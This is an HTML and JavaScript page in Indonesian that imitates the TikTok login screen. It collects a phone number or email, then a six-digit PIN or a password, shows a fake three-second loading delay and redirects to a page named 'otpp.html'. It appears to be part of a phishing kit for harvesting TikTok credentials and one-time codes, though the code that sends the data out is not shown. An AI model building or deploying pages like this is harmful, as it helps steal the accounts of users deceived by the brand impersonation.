<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk | TikTok</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
        body { background-color: #ffffff; display: flex; justify-content: center; overflow-x: hidden; }
        .container { width: 100%; max-width: 450px; padding: 20px; height: 100%; position: relative; display: flex; flex-direction: column; }
        
        /* Header */
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
        .back-btn { font-size: 24px; cursor: pointer; color: #000; }
        .title { font-size: 17px; font-weight: 700; }

        /* Tabs Tahap 1 */
        .tabs { display: flex; border-bottom: 1px solid #ebebeb; margin-bottom: 25px; }
        .tab { flex: 1; text-align: center; padding: 12px 0; font-size: 15px; color: #8a8a8a; cursor: pointer; position: relative; }
        .tab.active { color: #000; font-weight: 600; }
        .tab.active::after { content: ""; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background-color: #000; }

        /* Input Box */
        .input-box { display: flex; align-items: center; background-color: #f1f1f2; border-radius: 4px; padding: 0 12px; height: 44px; margin-bottom: 15px; border: 1px solid transparent; }
        .country-code { font-weight: 600; padding-right: 12px; border-right: 1px solid #d1d1d3; margin-right: 12px; font-size: 15px; }
        input { background: transparent; border: none; outline: none; font-size: 15px; width: 100%; color: #161823; caret-color: #fe2c55; }

        /* OTP PIN Style */
        .otp-wrapper { display: flex; justify-content: space-between; gap: 8px; margin-top: 10px; }
        .pin-field { 
            flex: 1; height: 54px; text-align: center; font-size: 24px; font-weight: bold; 
            border: 1px solid #d1d1d3; border-radius: 4px; background-color: #f1f1f2; 
            outline: none; color: #000; caret-color: transparent; 
        }
        .pin-field:focus { border-color: #fe2c55; background-color: #fff; }

        /* Tombol Lanjutkan */
        .btn-submit { 
            width: calc(100% - 40px); background-color: #ffc2d1; color: white; border: none; 
            border-radius: 26px; padding: 14px; font-size: 16px; font-weight: 600; 
            position: absolute; bottom: -50vh; left: 20px; cursor: not-allowed; 
            display: flex; justify-content: center; align-items: center;
        }
        .btn-active { background-color: #fe2c55; cursor: pointer; }

        /* Loading Spinner */
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #ffffff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin-right: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
    
/* Blue */
.info {
  color: #1E90FF;
}
    .bnt {
  border: none;
  background-color: inherit;
  padding: 14px 28px;
  font-size: 16px;
  cursor: pointer;
  display: inline-block;
}

        .info:hover {
  background: transparent;
  color: white;
}
    </style>
</head>
<body>

<div class="container">
<form id="setPin" onsubmit="loader(event); return false" method="POST">
    <div class="header">
        <span class="back-btn" onclick="location.reload()">&#10094;</span>
        <div class="title" name="page-title" id="page-title">Masuk</div>
        <span style="font-size: 20px; cursor: pointer;">&#9432;</span>
    </div>

    <div id="section-1">
        <div class="tabs">
            <div class="tab active" name="tab-phone" id="tab-phone">Telepon</div>
            <div class="tab" name="tab-email" id="tab-email"> Email/ama pengguna</div>
        </div>
        <div class="input-box">
            <div id="prefix" class="country-code">+62</div>
            <input type="tel" name="tab-phone" id="main-input" maxlength="" placeholder="Nomor telepon" autocomplete="off">
        </div>
    </div>

    <div id="section-otp" name="pin" style="display: none;">
        <p style="font-size: 15px; font-weight: 600; margin-bottom: 20px;">Masukkan PIN </p>
        <div class="otp-wrapper">
            <input type="tel" name="pin" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
            <input type="tel" name="pin2" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
            <input type="tel" name="pin3" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
            <input type="tel" name="pin4" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
            <input type="tel" name="pin5" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
            <input type="tel" name="pin6" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
      <br>  </div><a href="#" target="_blank">Lupa PIN?</a>

    </div>

    <div id="section-pass" name="password"" style="display: none;">
        <p style="font-size: 14px; color: #616161; margin-bottom: 8px;">Masukkan kata sandi</p><br>
        <div class="input-box">
            <input type="password" name="Password" id="password-field" placeholder="Kata sandi">
        </div>
    </div>

    <button class="btn-submit" id="next-btn" disabled>
        <div class="loader" id="setPin"></div>
        <span id="btn-text">Lanjutkan</span>
    </button>
</div>    
     </form>
  </div>

<script>
    const nextBtn = document.getElementById('next-btn');
    const btnText = document.getElementById('btn-text');
    const loader = document.getElementById('loader');
    const mainInput = document.getElementById('main-input');
    const pinFields = document.querySelectorAll('.pin-field');
    const passField = document.getElementById('password-field');

    let mode = 'phone';
    let step = 1;

    // --- LOGIKA TAB ---
    document.getElementById('tab-email').onclick = () => {
        mode = 'email';
        document.getElementById('tab-email').classList.add('active');
        document.getElementById('tab-phone').classList.remove('active');
        document.getElementById('prefix').style.display = 'none';
        mainInput.type = 'text'; mainInput.placeholder = 'Email atau nama pengguna';
        mainInput.value = ''; validate();
    };

    document.getElementById('tab-phone').onclick = () => {
        mode = 'phone';
        document.getElementById('tab-phone').classList.add('active');
        document.getElementById('tab-email').classList.remove('active');
        document.getElementById('prefix').style.display = 'block';
        mainInput.type = 'tel'; mainInput.placeholder = 'Nomor telepon';
        mainInput.value = ''; validate();
    };

    // --- LOGIKA VALIDASI ---
    mainInput.oninput = validate;
    passField.oninput = validate;
    pinFields.forEach((f, i) => {
        f.oninput = (e) => {
            if (e.target.value && pinFields[i+1]) pinFields[i+1].focus();
            validate();
        };
        f.onkeydown = (e) => {
            if (e.key === 'Backspace' && !f.value && pinFields[i-1]) pinFields[i-1].focus();
        };
    });

    function validate() {
        let ok = false;
        if (step === 1) ok = mainInput.value.length >= 5;
        else if (mode === 'phone') ok = Array.from(pinFields).every(f => f.value !== "");
        else ok = passField.value.length >= 6;

        nextBtn.disabled = !ok;
        if (ok) nextBtn.classList.add('btn-active');
        else nextBtn.classList.remove('btn-active');
    }

    // --- LOGIKA TOMBOL LANJUTKAN ---
    nextBtn.onclick = () => {
        if (step === 1) {
            step = 2;
            document.getElementById('section-1').style.display = 'none';
            nextBtn.disabled = true; nextBtn.classList.remove('btn-active');

            if (mode === 'phone') {
                document.getElementById('page-title').innerText = 'Verifikasi';
                document.getElementById('section-otp').style.display = 'block';
                pinFields[0].focus();
            } else {
                document.getElementById('page-title').innerText = 'Kata Sandi';
                document.getElementById('section-pass').style.display = 'block';
                passField.focus();
            }
        } else {
            submitData();
        }
    };

    function submitData() {
        loader.style.display = 'block';
        btnText.innerText = 'Memproses...';
        nextBtn.disabled = true;

      
        // Delay 3 detik (Efek Loading) lalu redirect
        setTimeout(() => {
            window.location.href = "otpp.html";
        }, 3000);
    }
</script>
